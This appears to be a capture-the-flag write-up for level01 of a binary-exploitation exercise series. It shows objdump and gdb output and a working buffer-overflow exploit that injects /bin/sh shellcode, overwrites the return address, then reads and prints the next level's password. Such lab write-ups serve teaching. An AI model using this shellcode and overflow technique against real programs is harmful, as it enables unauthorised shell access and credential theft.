## level01

```console
$ objdump -R level01
0804a008 R_386_JUMP_SLOT   puts@GLIBC_2.0
$ objdump -t level01 | grep user
[...]
0804a040 g     O .bss   00000064              a_user_name
```

```console
(gdb) b main
[...]
(gdb) run
[...]
(gdb) info frame
Stack level 0, frame at 0xffffc900:
 eip = 0x80484d5 in main; saved eip = 0xf7d90cb9
 Arglist at 0xffffc8f8, args: 
 Locals at 0xffffc8f8, Previous frame's sp is 0xffffc900
 Saved registers:
  ebp at 0xffffc8f8, eip at 0xffffc8fc
```

```console
(gdb) r
Starting program: /home/norxondor/42/override/level01/level01 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Seems that the return address is overwritten after 80 characters.

TODO: understand why 305 and not 306

```console
level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc0\x50\x04\x0b\x68//sh\x68/bin\x89\xe3\x31\xc9\x31\xd2\xcd\x80" + "A"*305 + "\x47\xa0\x04\x08"'; echo "cat /home/users/level02/.pass") | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```